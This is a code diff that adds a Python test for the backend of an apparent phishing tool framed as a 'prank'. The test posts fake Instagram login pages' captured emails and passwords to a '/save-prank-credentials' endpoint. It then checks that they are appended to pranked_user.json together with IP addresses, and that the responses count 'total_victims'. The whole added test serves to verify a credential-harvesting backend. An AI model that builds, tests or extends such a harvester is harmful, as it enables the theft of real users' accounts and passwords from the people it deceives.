@@ -204,6 +204,213 @@ def test_cors_headers():
         print(f"   ❌ Error: {str(e)}")
         return False
 
+def test_pranked_user_json_functionality():
+    """
+    Comprehensive test for pranked_user.json functionality as per review request:
+    1. Clean slate initialization
+    2. Submit 2 different payloads 
+    3. Verify append semantics
+    4. Test backward compatibility
+    5. Validate response correctness
+    """
+    print("\n🧪 Testing pranked_user.json functionality (Review Request)")
+    
+    pranked_user_file = Path("/app/backend/pranked_user.json")
+    
+    # Step 1: Initialize with clean slate
+    print("   Step 1: Removing existing pranked_user.json for clean slate")
+    if pranked_user_file.exists():
+        pranked_user_file.unlink()
+        print("   ✅ Removed existing file")
+    else:
+        print("   ✅ No existing file to remove")
+    
+    # Step 2: Submit first payload
+    print("   Step 2: Submitting first payload")
+    payload1 = {
+        "email": "alice.cooper@gmail.com",
+        "password": "rockstar2024",
+        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "url": "https://www.instagram.com/accounts/login/",
+        "prankedAt": datetime.now().isoformat(),
+        "timestamp": int(time.time() * 1000)
+    }
+    
+    try:
+        response1 = requests.post(
+            f"{API_BASE_URL}/save-prank-credentials",
+            json=payload1,
+            headers={"Content-Type": "application/json"}
+        )
+        
+        if response1.status_code != 200:
+            print(f"   ❌ First payload failed with status {response1.status_code}")
+            return False
+            
+        data1 = response1.json()
+        print(f"   ✅ First payload saved. Response: {data1}")
+        
+        # Verify response format
+        if not (data1.get("success") == True and 
+                "total_victims" in data1 and 
+                "victim_identifier" in data1 and 
+                "victim_ip" in data1):
+            print("   ❌ First response format incorrect")
+            return False
+            
+    except Exception as e:
+        print(f"   ❌ Error with first payload: {str(e)}")
+        return False
+    
+    # Step 3: Submit second payload
+    print("   Step 3: Submitting second payload")
+    payload2 = {
+        "email": "bob_musician",  # Username format
+        "password": "drummer123!",
+        "userAgent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "url": "https://www.instagram.com/accounts/login/",
+        "prankedAt": datetime.now().isoformat(),
+        "timestamp": int(time.time() * 1000)
+    }
+    
+    try:
+        response2 = requests.post(
+            f"{API_BASE_URL}/save-prank-credentials",
+            json=payload2,
+            headers={"Content-Type": "application/json"}
+        )
+        
+        if response2.status_code != 200:
+            print(f"   ❌ Second payload failed with status {response2.status_code}")
+            return False
+            
+        data2 = response2.json()
+        print(f"   ✅ Second payload saved. Response: {data2}")
+        
+        # Verify response format and total_victims increment
+        if not (data2.get("success") == True and 
+                data2.get("total_victims") == 2 and
+                data2.get("victim_identifier") == payload2["email"]):
+            print(f"   ❌ Second response incorrect. Expected total_victims=2, got {data2.get('total_victims')}")
+            return False
+            
+    except Exception as e:
+        print(f"   ❌ Error with second payload: {str(e)}")
+        return False
+    
+    # Step 4: Verify file contains array with 2 entries
+    print("   Step 4: Verifying file contains array with 2 entries")
+    
+    if not pranked_user_file.exists():
+        print("   ❌ pranked_user.json file was not created")
+        return False
+    
+    try:
+        with open(pranked_user_file, 'r') as f:
+            file_data = json.load(f)
+        
+        if not isinstance(file_data, list):
+            print(f"   ❌ File should contain array, got {type(file_data)}")
+            return False
+            
+        if len(file_data) != 2:
+            print(f"   ❌ Expected 2 entries, got {len(file_data)}")
+            return False
+        
+        # Verify each entry has required fields
+        required_fields = ["id", "emailOrUsername", "password", "ipAddress", "userAgent", "url", "prankedAt", "timestamp"]
+        
+        for i, entry in enumerate(file_data):
+            missing_fields = [field for field in required_fields if field not in entry]
+            if missing_fields:
+                print(f"   ❌ Entry {i+1} missing fields: {missing_fields}")
+                return False
+        
+        print(f"   ✅ File contains valid array with 2 entries")
+        print(f"   Entry 1: {file_data[0]['emailOrUsername']}")
+        print(f"   Entry 2: {file_data[1]['emailOrUsername']}")
+        
+    except json.JSONDecodeError:
+        print("   ❌ Invalid JSON in pranked_user.json")
+        return False
+    except Exception as e:
+        print(f"   ❌ Error reading file: {str(e)}")
+        return False
+    
+    # Step 5: Test backward compatibility - file already exists with valid JSON
+    print("   Step 5: Testing backward compatibility with existing valid JSON")
+    
+    payload3 = {
+        "email": "charlie.brown@hotmail.com",
+        "password": "snoopy456",
+        "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
+        "url": "https://www.instagram.com/accounts/login/",
+        "prankedAt": datetime.now().isoformat(),
+        "timestamp": int(time.time() * 1000)
+    }
+    
+    try:
+        response3 = requests.post(
+            f"{API_BASE_URL}/save-prank-credentials",
+            json=payload3,
+            headers={"Content-Type": "application/json"}
+        )
+        
+        if response3.status_code != 200:
+            print(f"   ❌ Third payload (backward compatibility) failed with status {response3.status_code}")
+            return False
+            
+        data3 = response3.json()
+        
+        if data3.get("total_victims") != 3:
+            print(f"   ❌ Backward compatibility failed. Expected total_victims=3, got {data3.get('total_victims')}")
+            return False
+            
+        print("   ✅ Backward compatibility test passed - appended to existing file")
+        
+    except Exception as e:
+        print(f"   ❌ Error with backward compatibility test: {str(e)}")
+        return False
+    
+    # Step 6: Test graceful handling of empty/invalid JSON
+    print("   Step 6: Testing graceful handling of empty/invalid JSON")
+    
+    # Create empty file
+    with open(pranked_user_file, 'w') as f:
+        f.write("")
+    
+    payload4 = {
+        "email": "diana.prince@amazon.com",
+        "password": "wonderwoman",
+        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "url": "https://www.instagram.com/accounts/login/",
+        "prankedAt": datetime.now().isoformat(),
+        "timestamp": int(time.time() * 1000)
+    }
+    
+    try:
+        response4 = requests.post(
+            f"{API_BASE_URL}/save-prank-credentials",
+            json=payload4,
+            headers={"Content-Type": "application/json"}
+        )
+        
+        if response4.status_code == 200:
+            data4 = response4.json()
+            print(f"   ✅ Empty file handled gracefully. Total victims: {data4.get('total_victims')}")
+        elif response4.status_code == 500:
+            print("   ⚠️  Empty file returned 500 - acceptable but could be improved")
+        else:
+            print(f"   ❌ Unexpected status code for empty file: {response4.status_code}")
+            return False
+            
+    except Exception as e:
+        print(f"   ❌ Error with empty file test: {str(e)}")
+        return False
+    
+    print("   ✅ All pranked_user.json functionality tests passed!")
+    return True
+
 def test_multiple_entries():
     """Test saving multiple prank credentials"""
     print("\n🧪 Testing multiple entries")
